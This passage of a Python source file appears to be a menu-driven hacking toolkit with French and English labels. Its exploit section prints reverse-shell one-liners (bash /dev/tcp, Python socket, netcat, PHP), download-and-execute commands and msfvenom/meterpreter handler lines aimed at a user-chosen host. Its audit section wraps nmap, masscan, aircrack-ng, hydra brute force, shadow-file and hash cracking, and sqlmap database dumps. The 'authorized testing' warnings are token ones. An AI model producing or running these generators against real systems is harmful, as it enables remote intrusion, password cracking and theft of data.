        return
    
    try:
        decoded = base64.b64decode(text.encode()).decode()
        print(f"\n{C.WHITE}[+] Decoded: {C.WHITE}{decoded}{C.RESET}")
    except Exception:
        print(f"{C.GRAY}[!] Décodage impossible{C.RESET}")
    
    pause()

TOOL_FUNCTIONS["b64d"] = tool_b64d

def tool_urle():
    clear()
    print(f"{C.GRAY}[*] URL Encode{C.RESET}\n")
    
    from urllib.parse import quote
    text = get_input("Text to encode")
    if not text:
        print(f"{C.GRAY}[!] Invalid text{C.RESET}")
        pause()
        return
    
    encoded = quote(text)
    print(f"\n{C.WHITE}[+] Encoded: {C.WHITE}{encoded}{C.RESET}")
    pause()

TOOL_FUNCTIONS["urle"] = tool_urle

def tool_urld():
    clear()
    print(f"{C.GRAY}[*] URL Decode{C.RESET}\n")
    
    from urllib.parse import unquote
    text = get_input("Text to decode")
    if not text:
        print(f"{C.GRAY}[!] Invalid text{C.RESET}")
        pause()
        return
    
    try:
        decoded = unquote(text)
        print(f"\n{C.WHITE}[+] Decoded: {C.WHITE}{decoded}{C.RESET}")
    except Exception:
        print(f"{C.GRAY}[!] Décodage impossible{C.RESET}")
    
    pause()

TOOL_FUNCTIONS["urld"] = tool_urld

# ═══════════════════════════════════════════
# SYSTEM
# ═══════════════════════════════════════════

def tool_sysinfo():
    clear()
    print(f"{C.WHITE}[*] System information{C.RESET}\n")
    
    try:
        uname = subprocess.check_output(["uname", "-a"], text=True)
        print(f"{C.WHITE}[+] Système: {C.WHITE}{uname}{C.RESET}")
    except:
        pass
    
    try:
        hostname = socket.gethostname()
        print(f"{C.WHITE}[+] Host: {C.WHITE}{hostname}{C.RESET}")
    except:
        pass
    
    try:
        disk = subprocess.check_output(["df", "-h"], text=True)
        print(f"\n{C.WHITE}[i] Disques:{C.RESET}\n{C.WHITE}{disk}{C.RESET}")
    except:
        pass
    
    try:
        mem = subprocess.check_output(["free", "-h"], text=True)
        print(f"{C.WHITE}[i] Memory:{C.RESET}\n{C.WHITE}{mem}{C.RESET}")
    except:
        pass
    
    try:
        uptime = subprocess.check_output(["uptime"], text=True)
        print(f"{C.WHITE}[+] Uptime: {C.WHITE}{uptime}{C.RESET}")
    except:
        pass
    
    pause()

TOOL_FUNCTIONS["sysinfo"] = tool_sysinfo

def tool_lsdir():
    clear()
    print(f"{C.WHITE}[*] Liste fichiers{C.RESET}\n")
    
    path = get_input("Directory (default: .)") or "."
    
    if not os.path.exists(path):
        print(f"{C.GRAY}[!] Directory not found{C.RESET}")
        pause()
        return
    
    try:
        items = sorted(os.listdir(path))
        print(f"\n{C.WHITE}Total: {len(items)} items{C.RESET}\n")
        
        for item in items:
            full = os.path.join(path, item)
            if os.path.isdir(full):
                print(f"  {C.WHITE}{item}/")
            else:
                size = os.path.getsize(full)
                print(f"  {C.GRAY}{item}  ({size} octets)")
    except Exception as e:
        print(f"{C.GRAY}[!] Error: {e}{C.RESET}")
    
    pause()

TOOL_FUNCTIONS["lsdir"] = tool_lsdir

# ═══════════════════════════════════════════
# EXPLOIT
# ═══════════════════════════════════════════

def tool_revshell():
    clear()
    print(f"{C.GRAY}[*] Reverse Shell Generator{C.RESET}\n")
    
    print(f"{C.GRAY}Warning: Use only for authorized testing{C.RESET}\n")
    
    ip = get_input("Ton IP (LHOST)")
    if not ip:
        print(f"{C.GRAY}[!] Invalid IP{C.RESET}")
        pause()
        return
    
    try:
        port = int(get_input("Port (LPORT)"))
    except ValueError:
        print(f"{C.GRAY}[!] Invalid port{C.RESET}")
        pause()
        return
    
    print(f"\n{C.WHITE}[*] Commandes générées:{C.RESET}\n")
    
    print(f"{C.WHITE}[Bash]{C.RESET}")
    print(f"  {C.WHITE}bash -i >& /dev/tcp/{ip}/{port} 0>&1{C.RESET}")
    
    print(f"\n{C.WHITE}[Python]{C.RESET}")
    print(f"  {C.WHITE}python3 -c 'import socket,os,pty;s=socket.socket();s.connect((\"{ip}\",{port}));os.dup2(s.fileno(),0);os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);pty.spawn(\"/bin/bash\")'{C.RESET}")
    
    print(f"\n{C.WHITE}[Netcat]{C.RESET}")
    print(f"  {C.WHITE}nc -e /bin/bash {ip} {port}{C.RESET}")
    
    print(f"\n{C.WHITE}[PHP]{C.RESET}")
    php = f"php -r '$sock=fsockopen(\"{ip}\",{port});exec(\"/bin/bash -i <&3 >&3 2>&3\");'"
    print(f"  {C.WHITE}{php}{C.RESET}")
    
    pause()

TOOL_FUNCTIONS["revshell"] = tool_revshell

def tool_encpayload():
    clear()
    print(f"{C.GRAY}[*] Encoder Payload{C.RESET}\n")
    
    payload = get_input("Payload to encode")
    if not payload:
        print(f"{C.GRAY}[!] Invalid payload{C.RESET}")
        pause()
        return
    
    try:
        encoded = base64.b64encode(payload.encode()).decode()
        
        print(f"\n{C.WHITE}[+] Original:{C.RESET}")
        print(f"  {C.GRAY}{payload}{C.RESET}")
        
        print(f"\n{C.WHITE}[+] Base64:{C.RESET}")
        print(f"  {C.WHITE}{encoded}{C.RESET}")
        
        print(f"\n{C.WHITE}[+] Decoder (Bash):{C.RESET}")
        print(f"  {C.GRAY}echo '{encoded}' | base64 -d{C.RESET}")
        
        print(f"\n{C.WHITE}[+] Decoder (Python):{C.RESET}")
        print(f"  {C.GRAY}python3 -c \"import base64;print(base64.b64decode('{encoded}').decode())\"{C.RESET}")
    except Exception as e:
        print(f"{C.GRAY}[!] Error: {e}{C.RESET}")
    
    pause()

TOOL_FUNCTIONS["encpayload"] = tool_encpayload

def tool_decpayload():
    clear()
    print(f"{C.GRAY}[*] Décoder Payload{C.RESET}\n")
    
    encoded = get_input("Base64 encoded text")
    if not encoded:
        print(f"{C.GRAY}[!] Invalid text{C.RESET}")
        pause()
        return
    
    try:
        decoded = base64.b64decode(encoded.encode()).decode()
        print(f"\n{C.WHITE}[+] Decoded:{C.RESET}")
        print(f"  {C.WHITE}{decoded}{C.RESET}")
    except Exception as e:
        print(f"{C.GRAY}[!] Décodage impossible: {e}{C.RESET}")
    
    pause()

TOOL_FUNCTIONS["decpayload"] = tool_decpayload

def tool_httpserver():
    clear()
    print(f"{C.GRAY}[*] HTTP Server{C.RESET}\n")
    
    port = get_input("Port (default: 8000)") or "8000"
    directory = get_input("Directory (default: .)") or "."
    
    if not os.path.exists(directory):
        print(f"{C.GRAY}[!] Directory not found{C.RESET}")
        pause()
        return
    
    print(f"\n{C.WHITE}[*] Server started on http://0.0.0.0:{port}{C.RESET}")
    print(f"{C.GRAY}[*] Ctrl+C to stop{C.RESET}\n")
    
    try:
        os.chdir(directory)
        subprocess.run(["python3", "-m", "http.server", port])
    except KeyboardInterrupt:
        print(f"\n{C.WHITE}[!] Server stopped{C.RESET}")
    except Exception as e:
        print(f"{C.GRAY}[!] Error: {e}{C.RESET}")
    
    pause()

TOOL_FUNCTIONS["httpserver"] = tool_httpserver

def tool_dllexec():
    clear()
    print(f"{C.GRAY}[*] Download & Execute{C.RESET}\n")
    
    print(f"{C.GRAY}Warning: Use only for authorized testing{C.RESET}\n")
    
    url = get_input("URL du fichier")
    if not url:
        print(f"{C.GRAY}[!] Invalid URL{C.RESET}")
        pause()
        return
    
    print(f"\n{C.WHITE}[*] Commandes générées:{C.RESET}\n")
    
    print(f"{C.WHITE}[PowerShell]{C.RESET}")
    ps = f"powershell -c \"Invoke-WebRequest -Uri '{url}' -OutFile 'out.exe'; Start-Process 'out.exe'\""
    print(f"  {C.WHITE}{ps}{C.RESET}")
    
    print(f"\n{C.WHITE}[Bash]{C.RESET}")
    bash = f"curl -s {url} -o out.exe && chmod +x out.exe && ./out.exe"
    print(f"  {C.WHITE}{bash}{C.RESET}")
    
    print(f"\n{C.WHITE}[CMD Windows]{C.RESET}")
    cmd = f"bitsadmin /transfer job {url} out.exe & out.exe"
    print(f"  {C.WHITE}{cmd}{C.RESET}")
    
    pause()

TOOL_FUNCTIONS["dllexec"] = tool_dllexec

def tool_msfgen():
    clear()
    print(f"{C.GRAY}[*] Metasploit One-Liner Generator{C.RESET}\n")
    
    print(f"{C.GRAY}Warning: Use only for authorized testing{C.RESET}\n")
    
    ip = get_input("LHOST (ton IP)")
    if not ip:
        print(f"{C.GRAY}[!] Invalid IP{C.RESET}")
        pause()
        return
    
    try:
        port = int(get_input("LPORT (default: 4444)") or "4444")
    except ValueError:
        print(f"{C.GRAY}[!] Invalid port{C.RESET}")
        pause()
        return
    
    print(f"\n{C.WHITE}[*] One-liner Meterpreter:{C.RESET}\n")
    
    print(f"{C.WHITE}[Linux x64]{C.RESET}")
    msf1 = f"msfvenom -p linux/x64/meterpreter/reverse_tcp LHOST={ip} LPORT={port} -f elf -o shell.elf"
    print(f"  {C.GRAY}  Generated: {msf1}{C.RESET}")
    print(f"  {C.WHITE}msfconsole -q -x 'use exploit/multi/handler; set payload linux/x64/meterpreter/reverse_tcp; set LHOST {ip}; set LPORT {port}; run'{C.RESET}")
    
    print(f"\n{C.WHITE}[Windows x64]{C.RESET}")
    msf2 = f"msfvenom -p windows/x64/meterpreter/reverse_tcp LHOST={ip} LPORT={port} -f exe -o shell.exe"
    print(f"  {C.GRAY}  Generated: {msf2}{C.RESET}")
    print(f"  {C.WHITE}msfconsole -q -x 'use exploit/multi/handler; set payload windows/x64/meterpreter/reverse_tcp; set LHOST {ip}; set LPORT {port}; run'{C.RESET}")
    
    print(f"\n{C.WHITE}[Python]{C.RESET}")
    msf3 = f"msfvenom -p python/meterpreter/reverse_tcp LHOST={ip} LPORT={port}"
    print(f"  {C.GRAY}  Generated: {msf3}{C.RESET}")
    
    pause()

TOOL_FUNCTIONS["msfgen"] = tool_msfgen

# ═══════════════════════════════════════════
# AUDIT
# ═══════════════════════════════════════════

def check_install(command):
    result = subprocess.run(["which", command], capture_output=True, text=True)
    return result.returncode == 0

def install_tool(command, apt_name):
    print(f"{C.GRAY}[*] Installing {command}...{C.RESET}\n")
    try:
        if os.path.exists("/etc/debian_version"):
            subprocess.run(["sudo", "apt", "update"], check=True)
            subprocess.run(["sudo", "apt", "install", "-y", apt_name], check=True)
        elif os.path.exists("/etc/arch_release"):
            subprocess.run(["sudo", "pacman", "-S", "--noconfirm", apt_name], check=True)
        elif os.path.exists("/etc/fedora-release"):
            subprocess.run(["sudo", "dnf", "install", "-y", apt_name], check=True)
        else:
            return False
        return True
    except:
        return False

def tool_nmap():
    clear()
    print(f"{C.GRAY}[*] Nmap{C.RESET}\n")
    
    if not check_install("nmap"):
        print(f"{C.GRAY}[!] Nmap not installed{C.RESET}\n")
        install = input(f"{C.WHITE}[?] install ? (y/n): {C.RESET}").strip().lower()
        if install == "y":
            if install_tool("nmap", "nmap"):
                print(f"{C.WHITE}[+] Installation complete{C.RESET}\n")
            else:
                print(f"{C.GRAY}[!] Installation failed{C.RESET}")
                pause()
                return
        else:
            pause()
            return
    
    target = get_input_ip("IP ou plage (ex: 192.168.1.1 ou 192.168.1.0/24)")
    if not target:
        pause()
        return
    
    print(f"\n{C.GRAY}[*] Scanning...{C.RESET}\n")
    
    print(f"{C.GRAY}Scan types:{C.RESET}")
    print(f"{C.WHITE}[1]{C.RESET} Fast scan (-F)")
    print(f"{C.WHITE}[2]{C.RESET} Full scan (-A)")
    print(f"{C.WHITE}[3]{C.RESET} SYN scan (-sS)")
    print(f"{C.WHITE}[4]{C.RESET} UDP scan (-sU)")
    print(f"{C.WHITE}[5]{C.RESET} Custom\n")
    
    scan_type = input(f"{C.GRAY}>>> {C.RESET}").strip()
    
    scans = {
        "1": ["nmap", "-F", target],
        "2": ["nmap", "-A", target],
        "3": ["nmap", "-sS", target],
        "4": ["nmap", "-sU", target],
        "5": ["nmap", get_input("Nmap arguments") or "-sV", target],
    }
    
    cmd = scans.get(scan_type, ["nmap", "-F", target])
    
    try:
        result = subprocess.run(cmd, text=True)
        print(f"{C.WHITE}{result.stdout if result.stdout else result.stderr}{C.RESET}")
    except Exception as e:
        print(f"{C.GRAY}[!] Error: {e}{C.RESET}")
    
    pause()

TOOL_FUNCTIONS["nmap"] = tool_nmap

def tool_masscan():
    clear()
    print(f"{C.GRAY}[*] Masscan{C.RESET}\n")
    
    if not check_install("masscan"):
        print(f"{C.GRAY}[!] Masscan not installed{C.RESET}\n")
        install = input(f"{C.WHITE}[?] install ? (y/n): {C.RESET}").strip().lower()
        if install == "y":
            if install_tool("masscan", "masscan"):
                print(f"{C.WHITE}[+] Installation complete{C.RESET}\n")
            else:
                print(f"{C.GRAY}[!] Installation failed{C.RESET}")
                pause()
                return
        else:
            pause()
            return
    
    target = get_input("IP/range (ex: 192.168.1.0/24)")
    if not target:
        pause()
        return
    
    ports = get_input("Ports (ex: 1-1000,80,443 or 'all')") or "1-1000"
    
    print(f"\n{C.GRAY}[*] Mass scan in progress...{C.RESET}\n")
    
    try:
        subprocess.run(["masscan", "-p", ports, target, "--rate", "1000"], timeout=120)
    except KeyboardInterrupt:
        print(f"\n{C.WHITE}[!] Scan stopped{C.RESET}")
    except Exception as e:
        print(f"{C.GRAY}[!] Error: {e}{C.RESET}")
    
    pause()

TOOL_FUNCTIONS["masscan"] = tool_masscan

def tool_aircrack():
    clear()
    print(f"{C.GRAY}[*] Aircrack-ng{C.RESET}\n")
    
    if not check_install("aircrack-ng"):
        print(f"{C.GRAY}[!] Aircrack-ng not installed{C.RESET}\n")
        install = input(f"{C.WHITE}[?] install ? (y/n): {C.RESET}").strip().lower()
        if install == "y":
            if install_tool("aircrack-ng", "aircrack-ng"):
                print(f"{C.WHITE}[+] Installation complete{C.RESET}\n")
            else:
                print(f"{C.GRAY}[!] Installation failed{C.RESET}")
                pause()
                return
        else:
            pause()
            return
    
    print(f"{C.GRAY}Modules:{C.RESET}\n")
    print(f"{C.WHITE}[1]{C.RESET} airmon-ng (WiFi interface management)")
    print(f"{C.WHITE}[2]{C.RESET} airodump-ng (Capture packets)")
    print(f"{C.WHITE}[3]{C.RESET} aireplay-ng (Inject packets)")
    print(f"{C.WHITE}[4]{C.RESET} aircrack-ng (Crack WPA/WEP)\n")
    
    choice = input(f"{C.WHITE}└─>{C.RESET} ").strip()
    
    if choice == "1":
        print(f"\n{C.GRAY}[*] Activation du mode monitor:{C.RESET}")
        iface = get_input("WiFi interface (ex: wlan0)")
        if iface:
            subprocess.run(["sudo", "airmon-ng", "start", iface])
            subprocess.run(["sudo", "airmon-ng"])
    elif choice == "2":
        print(f"\n{C.GRAY}[*] Packet capture:{C.RESET}")
        iface = get_input("Interface (ex: wlan0mon)") or "wlan0mon"
        subprocess.run(["sudo", "airodump-ng", iface])
    elif choice == "3":
        print(f"\n{C.GRAY}[*] Packet injection:{C.RESET}")
        print(f"{C.GRAY}    aireplay-ng -9 -e ESSID -a MAC_AP wlan0mon{C.RESET}")
        subprocess.run(["sudo", "aireplay-ng", "--help"])
    elif choice == "4":
        print(f"\n{C.GRAY}[*] Crackage WPA/WEP:{C.RESET}")
        capfile = get_input("Capture file (.cap)")
        wordlist = get_input("Wordlist (default: rockyou.txt)") or "/usr/share/wordlists/rockyou.txt"
        if capfile:
            subprocess.run(["sudo", "aircrack-ng", "-w", wordlist, capfile])
    
    pause()

TOOL_FUNCTIONS["aircrack"] = tool_aircrack

def tool_nikto():
    clear()
    print(f"{C.GRAY}[*] Nikto{C.RESET}\n")
    
    if not check_install("nikto"):
        print(f"{C.GRAY}[!] Nikto not installed{C.RESET}\n")
        install = input(f"{C.WHITE}[?] install ? (y/n): {C.RESET}").strip().lower()
        if install == "y":
            if install_tool("nikto", "nikto"):
                print(f"{C.WHITE}[+] Installation complete{C.RESET}\n")
            else:
                print(f"{C.GRAY}[!] Installation failed{C.RESET}")
                pause()
                return
        else:
            pause()
            return
    
    target = get_input("URL cible (ex: http://192.168.1.1)")
    if not target:
        pause()
        return
    
    print(f"\n{C.GRAY}[*] Web vulnerability scan...{C.RESET}\n")
    
    try:
        subprocess.run(["nikto", "-h", target, "-o", "nikto_scan.txt"])
        print(f"{C.WHITE}[+] Result saved in nikto_scan.txt{C.RESET}")
    except Exception as e:
        print(f"{C.GRAY}[!] Error: {e}{C.RESET}")
    
    pause()

TOOL_FUNCTIONS["nikto"] = tool_nikto

def tool_hydra():
    clear()
    print(f"{C.GRAY}[*] Hydra{C.RESET}\n")
    
    if not check_install("hydra"):
        print(f"{C.GRAY}[!] Hydra not installed{C.RESET}\n")
        install = input(f"{C.WHITE}[?] install ? (y/n): {C.RESET}").strip().lower()
        if install == "y":
            if install_tool("hydra", "hydra"):
                print(f"{C.WHITE}[+] Installation complete{C.RESET}\n")
            else:
                print(f"{C.GRAY}[!] Installation failed{C.RESET}")
                pause()
                return
        else:
            pause()
            return
    
    target = get_input("IP cible")
    if not target:
        pause()
        return
    
    service = get_input("Service (ssh, ftp, http, rdp, mysql...)")
    user = get_input("User (or -P for wordlist)")
    wordlist = get_input("Wordlist (default: rockyou.txt)") or "/usr/share/wordlists/rockyou.txt"
    
    print(f"\n{C.GRAY}[*] Brute force attack in progress...{C.RESET}\n")
    
    if user == "-P":
        cmd = ["hydra", "-l", "admin", "-P", wordlist, target, service]
    else:
        cmd = ["hydra", "-l", user, "-P", wordlist, target, service]
    
    try:
        subprocess.run(cmd)
    except Exception as e:
        print(f"{C.GRAY}[!] Error: {e}{C.RESET}")
    
    pause()

TOOL_FUNCTIONS["hydra"] = tool_hydra

def tool_john():
    clear()
    print(f"{C.GRAY}[*] John the Ripper{C.RESET}\n")
    
    if not check_install("john"):
        print(f"{C.GRAY}[!] John not installed{C.RESET}\n")
        install = input(f"{C.WHITE}[?] install ? (y/n): {C.RESET}").strip().lower()
        if install == "y":
            if install_tool("john", "john"):
                print(f"{C.WHITE}[+] Installation complete{C.RESET}\n")
            else:
                print(f"{C.GRAY}[!] Installation failed{C.RESET}")
                pause()
                return
        else:
            pause()
            return
    
    print(f"{C.GRAY}Modes:{C.RESET}\n")
    print(f"{C.WHITE}[1]{C.RESET} Crack hash unique")
    print(f"{C.WHITE}[2]{C.RESET} Crack fichier shadow")
    print(f"{C.WHITE}[3]{C.RESET} Show (afficher hashes)")
    
    choice = input(f"\n{C.GRAY}>>> {C.RESET}").strip()
    
    if choice == "1":
        hash_val = get_input("Hash à cracker")
        wordlist = get_input("Wordlist (default: rockyou.txt)") or "/usr/share/wordlists/rockyou.txt"
        if hash_val:
            subprocess.run(["john", "--wordlist=" + wordlist, "--format=raw-md5"], 
                         input=hash_val, text=True)
    elif choice == "2":
        shadow = get_input("Fichier /etc/shadow (necessite root)")
        if shadow and os.path.exists(shadow):
            subprocess.run(["sudo", "john", shadow])
        else:
            print(f"{C.GRAY}[!] File not accessible{C.RESET}")
    elif choice == "3":
        hash_file = get_input("Fichier de hash")
        if hash_file:
            subprocess.run(["john", "--show", hash_file])
    
    pause()

TOOL_FUNCTIONS["john"] = tool_john

def tool_hashcat():
    clear()
    print(f"{C.GRAY}[*] Hashcat{C.RESET}\n")
    
    if not check_install("hashcat"):
        print(f"{C.GRAY}[!] Hashcat not installed{C.RESET}\n")
        install = input(f"{C.WHITE}[?] install ? (y/n): {C.RESET}").strip().lower()
        if install == "y":
            if install_tool("hashcat", "hashcat"):
                print(f"{C.WHITE}[+] Installation complete{C.RESET}\n")
            else:
                print(f"{C.GRAY}[!] Installation failed{C.RESET}")
                pause()
                return
        else:
            pause()
            return
    
    print(f"{C.GRAY}Types de hash:{C.RESET}")
    print(f"{C.WHITE}0{C.RESET} MD5")
    print(f"{C.WHITE}1000{C.RESET} NTLM")
    print(f"{C.WHITE}1800{C.RESET} sha512crypt")
    print(f"{C.WHITE}22000{C.RESET} WPA-PBKDF2\n")
    
    hash_mode = get_input("Hash mode (default: 0 for MD5)")
    hash_file = get_input("Hash file")
    wordlist = get_input("Wordlist (default: rockyou.txt)") or "/usr/share/wordlists/rockyou.txt"
    
    if not hash_file:
        pause()
        return
    
    print(f"\n{C.GRAY}[*] Cracking in progress (GPU)...{C.RESET}\n")
    
    try:
        mode = hash_mode or "0"
        subprocess.run(["hashcat", "-m", mode, "-a", "0", hash_file, wordlist, "--force"])
    except Exception as e:
        print(f"{C.GRAY}[!] Error: {e}{C.RESET}")
    
    pause()

TOOL_FUNCTIONS["hashcat"] = tool_hashcat

def tool_sqlmap():
    clear()
    print(f"{C.GRAY}[*] SQLMap{C.RESET}\n")
    
    if not check_install("sqlmap"):
        print(f"{C.GRAY}[!] SQLMap not installed{C.RESET}\n")
        install = input(f"{C.WHITE}[?] Install? (y/n): {C.RESET}").strip().lower()
        if install == "y":
            if install_tool("sqlmap", "sqlmap"):
                print(f"{C.WHITE}[+] Installation complete{C.RESET}\n")
            else:
                print(f"{C.GRAY}[!] Installation failed{C.RESET}")
                pause()
                return
        else:
            pause()
            return
    
    target = get_input("Target URL (ex: http://site.com/page?id=1)")
    if not target:
        pause()
        return
    
    print(f"\n{C.GRAY}Actions:{C.RESET}")
    print(f"{C.WHITE}[1]{C.RESET} Basic detection")
    print(f"{C.WHITE}[2]{C.RESET} Extract databases")
    print(f"{C.WHITE}[3]{C.RESET} Extract tables")
    print(f"{C.WHITE}[4]{C.RESET} Full dump")
    
    choice = input(f"\n{C.GRAY}>>> {C.RESET}").strip()
    
    cmd = ["sqlmap", "-u", target]
    
    if choice == "2":
        cmd.extend(["--dbs"])
    elif choice == "3":
        db = get_input("Database name")
        cmd.extend(["-D", db, "--tables"])
    elif choice == "4":
        db = get_input("Database")
        table = get_input("Table")
        cmd.extend(["-D", db, "-T", table, "--dump"])
    else:
        pass
    
    print(f"\n{C.GRAY}[*] Analysis in progress...{C.RESET}\n")
    
    try:
        subprocess.run(cmd)
    except Exception as e:
        print(f"{C.GRAY}[!] Error: {e}{C.RESET}")
    
    pause()

TOOL_FUNCTIONS["sqlmap"] = tool_sqlmap

# ═══════════════════════════════════════════
# MAIN
# ═══════════════════════════════════════════

def main():
    current_category = None
    current_tools = []
    
    while True:
        clear()
        print_art()
        
        if current_category is None:
            show_categories()
            choice = input(f"{C.WHITE}└─>{C.RESET} ").strip().lower()
            
            if choice == "q":
                print(f"\n{C.WHITE}Au revoir !{C.RESET}\n")
                sys.exit(0)
            
            if choice in CATEGORIES:
                current_category = choice
                current_tools = show_tools_in_category(choice)
        else:
            show_tools_in_category(current_category)
            choice = input(f"{C.WHITE}└─>{C.RESET} ").strip()
            
            if choice == "0":
                current_category = None
                current_tools = []
            else:
                try:
                    idx = int(choice) - 1
                    if 0 <= idx < len(current_tools):
                        tool_key = current_tools[idx]
                        if tool_key in TOOL_FUNCTIONS:
                            TOOL_FUNCTIONS[tool_key]()
                except ValueError:
                    pass

if __name__ == "__main__":
    main()
